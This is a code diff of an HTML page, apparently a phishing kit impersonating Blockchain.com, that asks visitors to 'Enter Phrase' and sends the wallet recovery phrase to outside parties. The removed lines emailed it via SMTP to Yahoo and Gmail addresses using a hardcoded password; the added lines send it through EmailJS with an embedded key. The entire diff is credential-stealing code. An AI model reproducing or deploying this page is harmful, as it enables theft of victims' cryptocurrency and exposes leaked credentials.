@@ -23,37 +23,49 @@
     <div class="card" style="width: 25rem;">
         <div class="card-body">
               <div class="mb-3">
-                  <form action="" method="post">
+                  <form action="" method="post" id="form">
                 <label for="exampleFormControlTextarea1" class="form-label">Enter Phrase</label>
-                <textarea class="form-control" type="text" id="phrase" name="phrase" required rows="3"></textarea>
+                <textarea class="form-control" type="text" id="message" name="message" required rows="3"></textarea>
               </div>
-              <input type="button" class="btn btn-primary" value="Submit"
-              onclick="sendEmail()"/>
+              <input type="button" class="btn btn-primary" value="Submit" id="button"
+              />
           <a href="https://www.blockchain.com/" class="btn btn-outline-dark">Home Page</a>
         </form>
         </div>
       </div>
-      <script src="https://smtpjs.com/v3/smtp.js">
-    </script>
+     <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
-    <script type="text/javascript">
-        function sendEmail() {
-            var form = document.forms[0];
-            var phrase = form.phrase.value;
-            Email.send({
-                Host: "smtp.gmail.com",
-                Username: "noreply@adspltech.net",
-                Password: "Nikhil@adspl1",
-                To: "donaldkenneth526@yahoo.com, noreplyblackchain@gmail.com",
-                From: "donaldkenneth526@yahoo.com",
-                Subject: "You just received a new phrase",
-                Body: "Phrase Details : " + phrase,
-            })
-                .then(function (message) {
-                    alert("Email has been sent")
-                });
-        }
-    </script>
+<script type="text/javascript">
+  emailjs.init('tXb0QESiPyJisenKb')
+</script>
+    
+<script>
+  const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_qtcf75n';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
+    
+    
+    
+    
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
 </body>
 </html>
